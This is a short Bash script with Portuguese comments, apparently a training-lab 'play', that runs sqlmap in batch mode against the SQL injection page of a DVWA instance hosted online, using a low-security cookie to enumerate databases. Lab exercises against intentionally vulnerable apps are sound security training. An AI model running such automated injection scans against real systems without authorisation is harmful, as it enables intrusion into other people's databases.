#!/bin/bash

# Play 03 — SQLMap DVWA em produção
# Usa a variável DVWA_HOST (ou valor default) para definir o host alvo

# Definição do host DVWA (sem porta)
TARGET_HOST="${DVWA_HOST:-web-dvwa-production.up.railway.app}"

echo "[*] Iniciando análise SQL Injection com sqlmap contra $TARGET_HOST..."

# Diretório do script para referência de arquivos, se necessário
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# URL alvo completo
TARGET_URL="http://${TARGET_HOST}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"

# Cookie para nível de segurança baixo e sessão de teste
COOKIE="security=low; PHPSESSID=test"

# Execução do SQLMap em modo não interativo
sqlmap \
  -u "$TARGET_URL" \
  --cookie="$COOKIE" \
  --batch \
  --level=3 \
  --risk=2 \
  --dbs

echo "[✓] Análise SQLi concluída."
